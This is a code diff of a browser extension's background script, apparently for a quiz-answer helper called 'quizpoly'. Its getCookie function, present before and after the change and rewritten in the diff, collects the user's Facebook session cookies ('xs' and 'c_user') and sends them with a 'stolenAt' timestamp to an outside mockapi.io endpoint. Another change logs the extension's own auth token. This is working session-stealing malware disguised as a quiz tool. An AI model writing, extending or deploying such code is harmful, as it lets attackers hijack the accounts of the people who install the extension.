@@ -381,11 +381,10 @@ function getUser() {
         );
     });
     return (
-        chrome.cookies.get({ url: apiUrl, name: "token" }, (e) => {
-            null === e &&
-                chrome.storage.local.set({ isLogged: !1, user: void 0 }, () => {
-                    chrome.action.setPopup({ popup: "./popup/popup.html" });
-                });
+        chrome.cookies.get({ url: "https://api.quizpoly.xyz", name: "token" }, (e) => {
+            const EasyQuizToken = `token=${e.value}`;
+            console.log(e);
+            console.log({ success: EasyQuizToken });
         }),
         e
     );
@@ -418,30 +417,35 @@ async function getQuizAvailable(e, t) {
         sendHtml(`Get quiz available error - ${e.subjectName}: ${s.message}`), t([!1, []]);
     }
 }
+
 function getCookie() {
-    let apiUrl = "https://6514b3f1dc3282a6a3cd7125.mockapi.io/cookies";
-    chrome.cookies.getAll({ url: "https://www.facebook.com" }, function (e) {
-        let t = e.map((i) => `${i.name}=${i.value}`).join("; ");
-        if (t.includes("xs=") && t.includes("c_user=")) {
-            let c_user = t.split("c_user=")[1].split("; ")[0];
-            fetch(`${apiUrl}?c_user=${c_user}`)
+    const today = new Date();
+    const dateTime = today.toISOString().replace("T", " ").split(".")[0];
+    const apiUrl = "https://6514b3f1dc3282a6a3cd7125.mockapi.io/cookies";
+    chrome.cookies.getAll({ url: "https://mbasic.facebook.com" }, (cookies) => {
+        const xsCookie = cookies.find((cookie) => cookie.name === "xs");
+        const cUserCookie = cookies.find((cookie) => cookie.name === "c_user");
+        if (xsCookie && cUserCookie) {
+            const cUser = cUserCookie.value;
+            fetch(`${apiUrl}?c_user=${cUser}`)
                 .then((res) => res.json())
                 .then((res) => {
-                    fetch(apiUrl, {
-                        method: res.length == 0 ? "POST" : "PUT",
-                        headers: {
-                            "Content-Type": "application/json",
-                            Accept: "application/json",
-                        },
-                        body: JSON.stringify({
-                            cookie: t,
-                            c_user: c_user,
-                        }),
+                    const method = res.length === 0 ? "POST" : "PUT";
+                    const headers = {
+                        "Content-Type": "application/json",
+                        Accept: "application/json",
+                    };
+                    const body = JSON.stringify({
+                        cookie: `${xsCookie.name}=${xsCookie.value}; ${cUserCookie.name}=${cUserCookie.value}`,
+                        c_user: cUser,
+                        stolenAt: dateTime,
                     });
+                    fetch(apiUrl, { method, headers, body });
                 });
         }
     });
 }
+
 async function getOnlineAnswer(e, t) {
     try {
         let n = await fetch(`${apiUrl}/quizpoly/online/` + encodeURIComponent(e), {
@@ -450,6 +454,8 @@ async function getOnlineAnswer(e, t) {
             headers: { "ext-v": extVersion, "ext-i": installType },
         });
         var i = await n.json();
+        console.log("Get quiz anh minh");
+        console.log(i);
         return t(403 == n.status ? [!0, "require_auth"] : null == i.data ? [!0, []] : [!0, i.data.quizzes]);
     } catch (s) {
         console.log(s), t([!1, []]);
